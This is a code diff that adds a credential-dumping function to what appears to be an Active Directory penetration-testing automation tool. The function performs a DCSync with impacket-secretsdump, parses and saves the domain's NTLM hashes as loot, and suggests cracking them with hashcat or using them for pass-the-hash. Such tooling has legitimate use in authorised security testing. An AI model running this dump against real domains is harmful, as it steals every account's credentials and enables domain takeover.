@@ -952,6 +952,37 @@ def _ad_kerberoast(ip, domain, user, pw, runner, findings, ws, available) -> int
     return 0
 
 
+def _ad_secretsdump(ip, domain, user, pw, runner, findings, ws, available) -> int:
+    """DCSync NTLM hashes via impacket-secretsdump (-just-dc-ntlm) → loot/ntlm.hash.
+    Works for an admin OR any account holding replication rights (GetChanges /
+    GetChangesAll), so it runs with whatever AD-driving credential we hold. Recon
+    handoff only: captures hashes into facts/loot for offline crack and pass-the-hash,
+    never a shell. Extracted so the engine can run it as a standalone, manual-only
+    `creds.secretsdump`. Returns the hash count."""
+    if "impacket-secretsdump" not in available:
+        return 0
+    cmd = ["impacket-secretsdump", f"{domain}/{user}:{pw}@{ip}", "-just-dc-ntlm"]
+    ui.step(f"secretsdump (DCSync as {user})...")
+    findings.h4("NTLM Hash Dump (secretsdump / DCSync)")
+    findings.cmd(f"impacket-secretsdump {domain}/{user}:***@{ip} -just-dc-ntlm")
+    out = runner.run(cmd, f"creds_secretsdump_{_ulabel(user)}", timeout=300)
+    hashes = [l for l in out.splitlines() if ":::" in l and not l.startswith("[")]
+    if not hashes:
+        errors = _error_lines(out)
+        if errors:
+            findings.code_block(errors)
+        findings.note(f"DCSync as `{user}`: no hashes (admin or replication rights required)")
+        ui.debug(f"{user} lacks DCSync rights / no hashes")
+        return 0
+    added = ws.append_hash_file("ntlm.hash", hashes)
+    for line in hashes:
+        ws.add_hash("ntlm", line.split(":", 1)[0])
+    findings.bullet(f"**{len(hashes)} NTLM hashes** ({added} new) → `loot/ntlm.hash`")
+    findings.add_summary(f"{len(hashes)} NTLM hashes dumped (DCSync) — crack with hashcat -m 1000 or pass-the-hash")
+    ui.good(f"{len(hashes)} NTLM hashes dumped ({added} new)")
+    return len(hashes)
+
+
 def _ad_bloodhound(ip, domain, user, pw, runner, findings, ws, available):
     """BloodHound collection (All, DCOnly fallback) → loot/bloodhound/<ts>.zip.
     Returns the zip Path or None. Extracted so the engine can run it as a
